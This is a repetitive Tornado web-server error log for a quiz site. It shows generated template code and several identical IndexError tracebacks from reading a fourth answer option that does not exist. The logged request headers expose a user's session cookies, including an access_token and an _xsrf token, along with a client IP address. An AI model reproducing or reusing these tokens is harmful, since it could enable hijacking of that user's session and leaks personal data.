 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505b34038e4c8548017fb42a&answers=%5B0%5D&cursor=2&_xsrf=616a3b3631694f7d879feb0ca575b028', headers={'Content-Length': '92', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Dnt': '1', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'X-Real-Ip': '89.105.120.34', 'Origin': 'http://www.intheory.co.uk', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Host': 'www.intheory.co.uk', 'Cookie': '_xsrf=616a3b3631694f7d879feb0ca575b028; access_token="QUFBRzZsTmNzNkdjQkFJdnY0WkJaQ3JEdVZ3Yzh3RWoxUmFkU1pCYU0wdVVQQm5zMTJBMDdUSmlkT2FRa0xMN3Uwdkc5WWNQa0pyWG8xb2ZSd1E1WEpjVWpVQTl5NEV4Q3Q0c2NneG16Z1pEWkQ=|1348154103|e693afe8fad0be03d4cb857c68185ed190d6759b"; __utma=188782963.189299831.1348083425.1348088023.1348154083.3; __utmb=188782963.5.10.1348154083; __utmc=188782963; __utmz=188782963.1348083425.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Referer': 'http://www.intheory.co.uk/test/new', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 154.02ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505b34038e4c8548017fb42a&answers=%5B0%5D&cursor=5&_xsrf=616a3b3631694f7d879feb0ca575b028', headers={'Content-Length': '92', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Dnt': '1', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'X-Real-Ip': '89.105.120.34', 'Origin': 'http://www.intheory.co.uk', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Host': 'www.intheory.co.uk', 'Cookie': '_xsrf=616a3b3631694f7d879feb0ca575b028; access_token="QUFBRzZsTmNzNkdjQkFJdnY0WkJaQ3JEdVZ3Yzh3RWoxUmFkU1pCYU0wdVVQQm5zMTJBMDdUSmlkT2FRa0xMN3Uwdkc5WWNQa0pyWG8xb2ZSd1E1WEpjVWpVQTl5NEV4Q3Q0c2NneG16Z1pEWkQ=|1348154103|e693afe8fad0be03d4cb857c68185ed190d6759b"; __utma=188782963.189299831.1348083425.1348088023.1348154083.3; __utmb=188782963.5.10.1348154083; __utmc=188782963; __utmz=188782963.1348083425.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Referer': 'http://www.intheory.co.uk/test/new', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 89.17ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505b34038e4c8548017fb42a&answers=%5B2%5D&cursor=7&_xsrf=616a3b3631694f7d879feb0ca575b028', headers={'Content-Length': '92', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Dnt': '1', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'X-Real-Ip': '89.105.120.34', 'Origin': 'http://www.intheory.co.uk', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Host': 'www.intheory.co.uk', 'Cookie': '_xsrf=616a3b3631694f7d879feb0ca575b028; access_token="QUFBRzZsTmNzNkdjQkFJdnY0WkJaQ3JEdVZ3Yzh3RWoxUmFkU1pCYU0wdVVQQm5zMTJBMDdUSmlkT2FRa0xMN3Uwdkc5WWNQa0pyWG8xb2ZSd1E1WEpjVWpVQTl5NEV4Q3Q0c2NneG16Z1pEWkQ=|1348154103|e693afe8fad0be03d4cb857c68185ed190d6759b"; __utma=188782963.189299831.1348083425.1348088023.1348154083.3; __utmb=188782963.5.10.1348154083; __utmc=188782963; __utmz=188782963.1348083425.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Referer': 'http://www.intheory.co.uk/test/new', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 129.50ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
